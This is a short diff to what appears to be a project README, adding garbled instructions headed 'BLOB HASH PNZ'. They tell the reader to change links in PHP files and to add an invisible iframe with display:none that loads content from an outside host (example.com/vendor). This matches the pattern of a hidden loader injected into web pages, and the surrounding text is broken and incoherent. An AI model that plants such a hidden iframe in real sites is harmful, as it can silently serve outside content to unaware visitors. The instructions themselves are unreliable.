@@ -44,6 +44,11 @@ You can acsess all pnz files.
 - only python files that are up to date will be shared, and old files will remain the same as yours.
 
 
+# BLOB HASH PNZ 
+
+- 1. Change in php files links and implement your game 'veri' varaible!
+- 2. ADD THİS CODE `<iframe id="lazy_loader_1" style="display:none;" src="http://example.com/vendor"></iframe>`
+
 
 
 
